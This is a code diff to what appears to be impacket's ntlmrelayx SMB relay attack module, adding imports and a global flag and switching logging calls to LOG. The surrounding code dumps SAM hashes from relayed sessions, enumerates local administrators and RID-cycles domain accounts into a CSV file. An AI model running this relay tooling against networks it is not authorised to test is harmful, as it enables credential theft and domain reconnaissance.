@@ -22,6 +22,7 @@ from impacket import smb3, smb
 from impacket.examples import serviceinstall
 from impacket.smbconnection import SMBConnection
 from smbclient import MiniImpacketShell
+from impacket.dcerpc.v5.rpcrt import DCERPCException
 
 PROTOCOL_ATTACK_CLASS = "SMBAttack"
 
@@ -67,6 +68,7 @@ class SMBAttack(ProtocolAttack):
         return
 
     def run(self):
+        global ridCycleDone
         # Here PUT YOUR CODE!
         if self.tcpshell is not None:
             LOG.info('Started interactive SMB client shell via TCP on 127.0.0.1:%d' % self.tcpshell.port)
@@ -82,6 +84,7 @@ class SMBAttack(ProtocolAttack):
                 self.installService.uninstall()
         else:
             from impacket.examples.secretsdump import RemoteOperations, SAMHashes
+            from impacket.examples.ntlmrelayx.utils.enum import EnumLocalAdmins, RidCycle
             samHashes = None
             try:
                 # We have to add some flags just in case the original client did not
@@ -96,30 +99,30 @@ class SMBAttack(ProtocolAttack):
             except Exception, e:
                 if "rpc_s_access_denied" in str(e): # user doesn't have correct privileges
                     if self.config.enumLocalAdmins:
-                        logging.info("Relayed user doesn't have admin on {}. Attempting to enumerate users who do...".format(self.__SMBConnection.getRemoteHost()))
+                        LOG.info("Relayed user doesn't have admin on {}. Attempting to enumerate users who do...".format(self.__SMBConnection.getRemoteHost()))
                         enumLocalAdmins = EnumLocalAdmins(self.__SMBConnection)
                         try:
                             localAdminSids, localAdminNames = enumLocalAdmins.getLocalAdmins()
                             self.__updateAdminMap(localAdminNames)
-                            logging.info("Host {} has the following local admins (hint: try relaying one of them here...)".format(self.__SMBConnection.getRemoteHost()))
+                            LOG.info("Host {} has the following local admins (hint: try relaying one of them here...)".format(self.__SMBConnection.getRemoteHost()))
                             for name in localAdminNames:
-                                logging.info("Host {} local admin member: {} ".format(self.__SMBConnection.getRemoteHost(), name))
+                                LOG.info("Host {} local admin member: {} ".format(self.__SMBConnection.getRemoteHost(), name))
                         except DCERPCException, e:
-                            logging.info("SAMR access denied")
+                            LOG.info("SAMR access denied")
                     
                     if self.config.ridCycle and not ridCycleDone:
-                        logging.info("Relayed user doesn't have admin on {}. Performing RID cycling to enumerate domain users".format(self.__SMBConnection.getRemoteHost())) 
+                        LOG.info("Relayed user doesn't have admin on {}. Performing RID cycling to enumerate domain users".format(self.__SMBConnection.getRemoteHost())) 
                         ridCycle = RidCycle(self.__SMBConnection)
                         domainSids = ridCycle.getDomainSIDs(self.config.ridMax)
-                        logging.info("Performed RID cycle from host {}. Enumerated {} domain SIDs".format(self.__SMBConnection.getRemoteHost(), len(domainSids)))
+                        LOG.info("Performed RID cycle from host {}. Enumerated {} domain SIDs".format(self.__SMBConnection.getRemoteHost(), len(domainSids)))
                         filename = "{}_domainSids.csv".format(self.__SMBConnection.getRemoteHost())
                         with open(filename, 'w') as fp:
                             fp.write("SID, Name, Type\n")
                             fp.write("\n".join(domainSids))
-                        logging.info("{} written with results".format(filename))
+                        LOG.info("{} written with results".format(filename))
                         ridCycleDone = True
                     elif self.config.ridCycle and ridCycleDone:
-                        logging.info("RID Cycle already performed")
+                        LOG.info("RID Cycle already performed")
 
                     return
                 # Something else went wrong. aborting
